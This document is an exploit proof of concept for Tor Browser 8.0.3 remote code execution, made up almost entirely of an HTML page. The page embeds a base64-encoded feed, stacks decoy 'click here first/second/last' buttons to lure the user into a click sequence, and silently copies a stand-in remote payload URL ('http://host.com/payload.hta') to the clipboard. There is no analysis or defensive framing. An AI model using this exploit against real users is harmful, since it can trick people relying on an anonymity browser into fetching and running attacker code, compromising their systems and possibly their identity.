# Tor Browser 8.0.3 RCE 
```
<html>
<head>
	<title>Tor Browser 8.0.3 RCE</title>
<style>
#qdiv{
	border:0px solid red;
	width:400px;
	height:300px;
}

#qem{
	width:400px;
	height:300px;
	
	opacity:0.5;
}

#qbutt{
position:absolute;
top:125px;
left:235px;
width:105px;
}

#qclick{
position:absolute;
top:50px;
left:110px;
width:145px;
}

#qcopy{
position:absolute;
z-index:1000;
}
#qin{
opacity:0.0;
}

#qmsg{
position:absolute;
z-index:9000;
top:50px;
left:270px;
}
</style>
</head>
<body>
<button id="qcopy">Click here first to copy URL</button>
<div id="qdiv"><button id="qbutt">Click here last</button>
<button id="qclick">Click here second</button><div id="qmsg">Tor Browser 8.0.3 RCE</div>
<embed id="qem" type="application/vnd.mozilla.maybe.feed" src="data:application/vnd.mozilla.maybe.feed;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxmZWVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDA1L0F0b20iPg0KICA8dGl0bGU+cTwvdGl0bGU+DQogIDxsaW5rIGhyZWY9InEiLz4NCiAgPHVwZGF0ZWQ+cTwvdXBkYXRlZD4NCiAgPGF1dGhvcj4NCiAgICA8bmFtZT5xPC9uYW1lPg0KICA8L2F1dGhvcj4NCiAgPGlkPnE8L2lkPg0KICANCiAgPGVudHJ5Pg0KPHRpdGxlIHR5cGU9InhodG1sIj4NCiAgPGRpdiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+DQogICAgPGI+djxpPmFsPC9pPmlkIDxxPmh0bWw8L3E+PC9iPg0KICA8L2Rpdj4NCjwvdGl0bGU+DQogICAgPHVwZGF0ZWQ+cTwvdXBkYXRlZD4NCiAgICA8c3VtbWFyeT5xPC9zdW1tYXJ5Pg0KICA8L2VudHJ5Pg0KPC9mZWVkPg==" ></body>

</div>
<input id="qin" type="text" value="http://host.com/payload.hta"/>

<script>


qcopy.addEventListener("click", function(){qin.select();
  document.execCommand("Copy");});
</script>
</body>
</html>
```
